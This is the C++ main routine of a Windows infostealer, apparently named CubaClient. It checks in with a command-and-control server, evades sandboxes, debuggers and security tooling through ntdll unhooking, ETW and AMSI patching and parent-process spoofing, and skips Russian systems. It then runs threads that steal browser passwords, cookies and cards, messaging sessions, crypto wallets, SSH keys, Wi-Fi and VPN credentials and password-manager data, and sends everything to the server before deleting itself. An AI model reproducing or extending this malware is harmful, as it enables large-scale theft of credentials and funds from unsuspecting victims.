#include <iostream>
#include <thread>
#include <vector>
#include <sysinfo.hpp>
#include <browser_utils/get_browsers.hpp>
#include <ccurrency_utils/get_crypto.hpp>
#include <gecko/extract_gecko.hpp>
#include <chromium/extract_chromium.hpp>
#include <safety_utils/antivm.hpp>
#include <safety_utils/antitarg.hpp>
#include <safety_utils/evasion.hpp>
#include <windows.h>
#include <format>
#include <net_utils/simple_net.hpp>
#include <exfiltration_utils/zip.hpp>
#include <exfiltration_utils/log_collection.hpp>
#include <exfiltration_utils/mem_store.hpp>
#include <misc_stealing/notepadpp.hpp>
#include <misc_stealing/extensions.hpp>
#include <misc_stealing/discord.hpp>
#include <misc_stealing/telegram.hpp>
#include <misc_stealing/system_misc.hpp>
#include <misc_stealing/ftp_clients.hpp>
#include <misc_stealing/gaming.hpp>
#include <misc_stealing/vpn.hpp>
#include <misc_stealing/cold_wallets.hpp>
#include <misc_stealing/mail_clients.hpp>
#include <misc_stealing/dev_tools.hpp>
#include <misc_stealing/credentials.hpp>
#include <misc_stealing/password_managers.hpp>
#include <obfuscation/syscall.hpp>
#include <obfuscation/opaque.hpp>
#include <crypto_utils/skCrypter.hpp>

#ifndef _DEBUG
#include <obfuscation/unhook.hpp>
#include <obfuscation/ppid_spoof.hpp>
#endif

namespace opaque {
    volatile DWORD _seed = 0;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    opaque::_seed = GetTickCount();
    simple_net::c2_check c2;

#ifndef _DEBUG
    //uptime sandbox 
#ifdef FEATURE_ANTIVM
    if (antivm::is_low_uptime())
        return 0;
#endif

    //residential + C2 liveness in one request, server handles ip lookup
    c2 = simple_net::check_c2();
    if (!c2.ok || !c2.residential) {
        exfiltration_utils::self_delete();
        return 0;
    }

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    syscall_utils::init(ntdll);

#ifdef FEATURE_UNHOOK
    unhook::unhook_ntdll();
    //reinit from clean copy so syscall IDs come from unhooked exports
    if (LPVOID clean = unhook::get_clean_ntdll())
        syscall_utils::init((HMODULE)clean);
#endif
#ifdef FEATURE_ETW_PATCH
    evasion::patch_etw();
#endif
#ifdef FEATURE_AMSI_PATCH
    evasion::patch_amsi();
#endif
    evasion::wipe_pe_header();

#ifdef FEATURE_PPID_SPOOF
    if (!ppid_spoof::already_spoofed())
        ppid_spoof::relaunch();
#endif

#ifdef FEATURE_ANTIVM
    if (evasion::is_debugged() || evasion::has_hw_breakpoints() ||
        evasion::is_kernel_debugger() || evasion::is_debugger_parent() ||
        evasion::is_sandbox_resolution())
        return 0;
    if (antivm::calc_risk() > 45)
        return 0;
#endif
#ifdef FEATURE_ANTITARG
    if (utils::is_russian() || utils::is_russian_loaded() || utils::is_sandbox_name())
        return 0;
#ifdef FEATURE_ANALYST_PATH_CHECK
    if (utils::is_analyst_path())
        return 0;
#endif
#endif

#else
    AllocConsole();
    freopen("CONOUT$", "w", stdout);
    freopen("CONOUT$", "w", stderr);
    freopen("CONIN$", "r", stdin);
    SetConsoleTitleA("CubaClient dbg");

    c2 = simple_net::check_c2();
    std::cout << "temp:     " << features::get_temp().string() << '\n';
    std::cout << "user:     " << features::get_username()      << '\n';
    std::cout << "home:     " << features::get_home()          << '\n';
    std::cout << "ip:       " << c2.ip                         << '\n';
    std::cout << "admin:    " << features::is_admin()          << '\n';
    std::wcout << L"version:  " << features::get_version()     << '\n';
    std::cout << "vm score: " << antivm::calc_risk()           << '\n';
    std::cout << "russian:  " << utils::is_russian()           << '\n';
#endif

#ifdef FEATURE_SCREENSHOT
    misc_exfiltration::steal_screenshot();
#endif

    //collect profiles before spawning threads
#ifdef FEATURE_GECKO
    auto gecko_profiles    = features::get_gecko_profiles();
#endif
#ifdef FEATURE_CHROMIUM
    auto chromium_profiles = features::get_chromium_profiles();
#endif

    //all modules are independent I/O, run concurrently
    std::vector<std::thread> workers;

#ifdef FEATURE_CHROMIUM
    workers.emplace_back([&chromium_profiles] {
        features::extract_chromium_all(chromium_profiles);
    });
#endif

#ifdef FEATURE_GECKO
    workers.emplace_back([&gecko_profiles] {
        features::extract_gecko_cookies(gecko_profiles);
        features::extract_gecko_passwords(gecko_profiles);
        features::extract_gecko_history(gecko_profiles);
        features::extract_gecko_autofill(gecko_profiles);
        features::extract_gecko_cards(gecko_profiles);
    });
#endif

#ifdef FEATURE_DISCORD
    workers.emplace_back([] { misc_exfiltration::steal_discord(); });
#endif

#ifdef FEATURE_TELEGRAM
    workers.emplace_back([] { misc_exfiltration::steal_telegram(); });
#endif

#ifdef FEATURE_GAMING
    workers.emplace_back([] { misc_exfiltration::steal_gaming(); });
#endif

#ifdef FEATURE_COLDWALLET
    workers.emplace_back([] { misc_exfiltration::steal_cold_wallets(); });
#endif

#ifdef FEATURE_CRYPTO
    workers.emplace_back([] { utils::steal_wallets(); });
#endif

#ifdef FEATURE_CREDENTIALS
    workers.emplace_back([] {
        misc_exfiltration::steal_all_credentials();
        misc_exfiltration::steal_putty();
        misc_exfiltration::steal_rdp_hosts();
    });
#endif

#ifdef FEATURE_DEVTOOLS
    workers.emplace_back([] { misc_exfiltration::steal_dev_tools(); });
#endif

#ifdef FEATURE_PASSWORD_MANAGERS
    workers.emplace_back([] { misc_exfiltration::steal_password_managers(); });
#endif

#ifdef FEATURE_FTP
    workers.emplace_back([] { misc_exfiltration::steal_ftp_clients(); });
#endif

#ifdef FEATURE_VPN
    workers.emplace_back([] { misc_exfiltration::steal_vpn(); });
#endif

#ifdef FEATURE_MAIL
    workers.emplace_back([] { misc_exfiltration::steal_mail_clients(); });
#endif

    //lightweight, run on main thread while workers are going
#ifdef FEATURE_NOTEPADPP
    misc_exfiltration::steal_notepadpp();
#endif
#ifdef FEATURE_EXTENSIONS
    misc_exfiltration::steal_chromium_extensions();
    misc_exfiltration::steal_gecko_extensions();
#endif
#ifdef FEATURE_CLIPBOARD
    misc_exfiltration::steal_clipboard();
#endif
#ifdef FEATURE_SSH
    misc_exfiltration::steal_ssh_keys();
#endif
#ifdef FEATURE_WIFI
    misc_exfiltration::steal_wifi_passwords();
#endif

    for (auto& w : workers) w.join();

    exfiltration_utils::exfiltrate_logs(skCrypt(C2_API_KEY_STR), c2.ip, c2.country);

#ifndef _DEBUG
    //self_delete called inside exfiltrate_logs on success
#else
    std::cin.get();
    FreeConsole();
#endif

    return 0;
}
